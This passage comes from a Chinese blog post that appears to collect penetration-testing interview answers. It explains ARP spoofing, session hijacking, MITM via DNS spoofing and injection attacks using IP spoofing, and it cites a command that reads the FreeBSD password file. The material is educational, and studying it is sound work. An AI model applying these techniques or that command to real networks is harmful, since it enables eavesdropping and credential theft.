+<p>上面提到过了 ARP 缓存表，在每台主机都有一个 ARP 缓存表，缓存表中记录了IP 地址与 MAC 地址的对应关系，而局域网数据传输依靠的是 MAC 地址。假设主机 A 192.168.1.2,B 192.168.1.3,C 192.168.1.4; 网关 G 192.168.1.1; 在同一局域网，主机 A 和 B 通过网关 G 相互通信，就好比 A 和 B 两个人写信，由邮递员 G 送信，C 永远都不会知道 A 和 B 之间说了些什么话。但是并不是想象中的那么安全，在 ARP 缓存表机制存在一个缺陷，就是当请求主机收到 ARP应答包后，不会去验证自己是否向对方主机发送过 ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关系，原有的则会被替换。这样 C 就有了偷听 A 和 B 的谈话的可能，继续思考上面的例子：C 假扮邮递员，首先要告诉 A 说：“我就是邮递员” （C 主机向 A 发送构造好的返回包，源 IP 为 G 192.168.1.1，源 MAC 为 C 自己的 MAC 地址），愚蠢的A 很轻易的相信了，直接把“C 是邮递员”这个信息记在了脑子里；C 再假扮 A，告诉邮递员：“我就是 A” （C 向网关 G 发送构造好的返回包，源 IP 为 A 192.168.1.2，源 MAC 地址为自己的 MAC 地址），智商捉急的邮递员想都没想就相信了，以后就把 B 的来信送给了 C，C 当然就可以知道 A 和 B之间聊了些什么上面 ABCG 的故事就是 ARP 双向欺骗的原理了</p>
+<p>ARP 单向欺骗就更好理解了，C 只向 A 发送一个返回包，告诉 A：G 192.168.1.1 的 MAC 地址为 5c-63-bf-79-1d-fa（一个错误的 mac 地址），A 把这个信息记录在了缓存表中，而 G 的缓存表不变，也就是说，A 把数据包给了 C，而 G的包还是给 A，这样就是 ARP 单向欺骗了。</p>
+<p><strong>28.会话劫持原理?</strong></p>
+<p>在现实生活中，比如你去市场买菜，在交完钱后你要求先去干一些别的事情，稍候再来拿菜；如果这个时候某个陌生人要求把菜拿走，卖菜的人会把菜给陌生人吗？！当然，这只是一个比喻，但这恰恰就是会话劫持的喻意。所谓会话，就是两台主机之间的一次通讯。例如你 Telnet 到某台主机，这就是一次 Telnet 会话；你浏览某个网站，这就是一次 HTTP 会话。而会话劫持（Session Hijack），就是结合了嗅探以及欺骗技术在内的攻击手段。例如，在一次正常的会话过程当中，攻击者作为第三方参与到其中，他可以在正常数据包中插入恶意数据，也可以在双方的会话当中进行简听，甚至可以是代替某一方主机接管会话。我们可以把会话劫持攻击分为两种类型：</p>
+<p>1）中间人攻击(Man In The Middle，简称 MITM)， </p>
+<p>2）注射式攻击（Injection）；并且还可以把会话劫持攻击分为两种形式：</p>
+<p>1.被动劫持 2.主动劫持</p>
+<p>被动劫持实际上就是在后台监视双方会话的数据流，丛中获得敏感数据；而主动劫持则是将会话当中的某一台主机“踢”下线，然后由攻击者取代并接管会话，这种攻击方法危害非常大，攻击者可以做很多事情，比如“cat etc/master.passwd”（FreeBSD 下的 Shadow 文件）。图 1 为会话劫持示意图。</p>
+<p><strong>29.MITM 攻击简介？</strong></p>
+<p>这也就是我们常说的“中间人攻击”，在网上讨论比较多的就是 SMB 会话劫持，这也是一个典型的中间人攻击。要想正确的实施中间人攻击，攻击者首先需要使用 ARP 欺骗或 DNS 欺骗，将会话双方的通讯流暗中改变，而这种改变对于会话双方来说是完全透明的。关于 ARP 欺骗黑客防线介绍的比较多，网上的资料也比较多，我就不在多说了，我只简单谈谈 DNS 欺骗。DNS（Domain Name System），即域名服务器，我们几乎天天都要用到。对于正常的 DNS 请求，例如在浏览器输入 <a href="http://www.hacker.com.cn，然后系统先查看" target="_blank" rel="noopener">www.hacker.com.cn，然后系统先查看</a> Hosts 文件，如果有相对应的 IP，就使用这个 IP 地址访问网站（其实，利用 Hosts 文件就可以实现DNS 欺骗）；如果没有，才去请求 DNS 服务器；DNS 服务器在接收到请求之后，解析出其对应的 IP 地址，返回给我本地，最后你就可以登陆到黑客防线的网站。而 DNS 欺骗则是，目标将其 DNS 请求发送到攻击者这里，然后攻击者伪造 DNS 响应，将正确的 IP 地址替换为其他 IP，之后你就登陆了这个攻击者指定的 IP，而攻击者早就在这个 IP 中安排好了恶意网页，可你却在不知不觉中已经被攻击者下了“套”……DNS 欺骗也可以在广域网中进行，比较常见的有“Web 服务器重定向”、“邮件服务器重定向”等等。但不管是 ARP 欺骗，还是 DNS 欺骗，中间人攻击都改变正常的通讯流，它就相当于会话双方之间的一个透明代理，可以得到一切想知道的信息，甚至是利用一些有缺陷的加密协议来实现。</p>
+<p><strong>30.注射式攻击简介？</strong></p>
+<p>这种方式的会话劫持比中间人攻击实现起来简单一些，它不会改变会话双方的通讯流，而是在双方正常的通讯流插入恶意数据。在注射式攻击中，需要实现两种技术：1）IP 欺骗，2）预测 TCP 序列号。如果是 UDP 协议，只需伪造 IP 地址，然后发送过去就可以了，因为 UDP 没有所谓的 TCP 三次握手，但基于 UDP 的应用协议有流控机制，所以也要做一些额外的工作。对于 IP 欺骗，有两种情况需要用到：1）隐藏自己的 IP 地址；2）利用两台机器之间的信任关系实施入侵。在 Unix/Linux 平台上，可以直接使用 Socket 构造 IP 包，在 IP 头中填上虚假的IP 地址，但需要 root 权限；在 Windows 平台上，不能使用 Winsock，需要使用 Winpacp（也可以使用 Libnet）。例如在 Linux 系统，首先打开一个RawSocket（原始套接字），然后自己编写 IP 头及其他数据。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%B8%89)/" data-id="ck4ifvaul0016jouv0pz9554g"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95/" rel="tag">面试</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98(%E4%BA%8C)/" class="article-nav-link">
+        <strong class="article-nav-caption">后一篇</strong>
+        <div class="article-nav-title">渗透测试面试总结(二)</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 Melon</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Melon"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="/js/tocbot.min.js"></script>
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script src="/js/ocean.js"></script>
+
+</body>
+</html>
